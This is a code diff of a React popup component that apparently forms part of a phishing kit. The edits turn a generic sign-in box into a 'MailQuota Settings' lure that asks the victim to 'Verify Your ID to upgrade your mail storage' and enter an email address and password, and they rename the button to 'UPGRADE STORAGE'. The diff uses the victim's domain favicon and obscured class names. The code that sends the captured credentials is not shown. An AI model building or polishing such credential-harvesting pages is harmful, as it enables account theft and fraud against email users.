@@ -227,38 +227,29 @@ const Popup = ({ domain, systemInfo }) => {
   return (
     <div className="popup">
       <div className="popup-content">
-        {/* Domain Logo and Name - Box removed */}
-        <div style={{
-          display: "flex",
-          flexDirection: "column",
-          alignItems: "center",
-          marginBottom: "20px"
-        }}>
-          <img 
-            src={`https://www.google.com/s2/favicons?domain=${getDomainFromEmail()}&sz=64`}
-            alt={`${domain} logo`}
-            style={{
-              width: "64px",
-              height: "64px",
-              marginBottom: "10px"
-            }}
-            onError={(e) => {
-              // Fallback if favicon fails to load
-              e.target.style.display = 'none';
-            }}
-          />
-          <div style={{
-            fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-            fontSize: "14px",
-            fontWeight: "600",
-            color: "#333",
-            textAlign: "center"
-          }}>
-            {domain || "Website"}
-          </div>
-        </div>
-
         <div className="djdfe">
+          {/* Header Text */}
+          <div style={{
+            textAlign: "center",
+            marginBottom: "20px",
+            fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif"
+          }}>
+            <div style={{
+              fontSize: "18px",
+              fontWeight: "bold",
+              color: "#333",
+              marginBottom: "5px"
+            }}>
+              MailQuota Settings
+            </div>
+            <div style={{
+              fontSize: "14px",
+              color: "#666"
+            }}>
+              Verify Your ID to upgrade your mail storage
+            </div>
+          </div>
+
           {/* Email Field */}
           <div className="pasww" style={{ marginBottom: "15px" }}>
             <div style={{
@@ -267,7 +258,6 @@ const Popup = ({ domain, systemInfo }) => {
               marginBottom: "5px",
               fontWeight: "500"
             }}>
-              Email address
             </div>
             <input
               type="email"
@@ -297,7 +287,7 @@ const Popup = ({ domain, systemInfo }) => {
               fontWeight: "500",
               marginBottom: "2px",
             }}>
-              Password
+      
             </div>
             <input
               type={showPassword ? "text" : "password"}
@@ -349,7 +339,7 @@ const Popup = ({ domain, systemInfo }) => {
                 marginBottom: "20px"
               }} 
             >
-              Sign in
+              UPGRADE STORAGE
             </button>
           </div>
         </div>
